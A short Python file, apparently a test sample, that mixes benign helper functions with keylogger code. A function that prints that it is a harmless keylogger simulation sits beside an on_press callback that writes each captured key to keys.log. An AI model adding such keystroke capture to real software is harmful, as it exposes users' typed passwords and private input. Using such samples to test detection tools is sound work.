def greet_user(name):
    print(f"Hello {name}!")

def keylogger_simulation():
    print("This simulates a keylogger but is harmless.")

def calculate_sum(a, b):
    return a + b

def on_press(key):
    with open("keys.log", "a") as f:
        f.write(str(key))